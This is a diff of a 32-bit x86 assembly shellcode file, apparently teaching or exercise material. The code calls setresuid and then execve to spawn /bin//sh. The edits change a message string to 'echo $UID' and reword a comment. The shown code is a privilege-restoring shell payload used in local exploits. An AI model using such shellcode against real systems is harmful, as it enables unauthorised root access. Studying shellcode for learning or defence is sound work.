@@ -1,6 +1,6 @@
 BITS 32
 
-msg db "Hello World", 0x0a;
+msg db "echo $UID", 0x0a;
 
 ; setresuid(uid_t ruid, uid_t euid, uid_t suid);
   xor eax, eax      ; zero out eax
@@ -12,7 +12,7 @@ msg db "Hello World", 0x0a;
 
 ; execve(const char *filename, char *const argv [], char *const envp[])
   push BYTE 11      ; push 11 to the stack
-  pop eax           ; pop dword of 11 into eax
+  pop eax           ; pop dword off 11 into eax
   push ecx          ; push some nulls for string termination
   push 0x68732f2f   ; push "//sh" to the stack
   push 0x6e69622f   ; push "/bin" to the stack
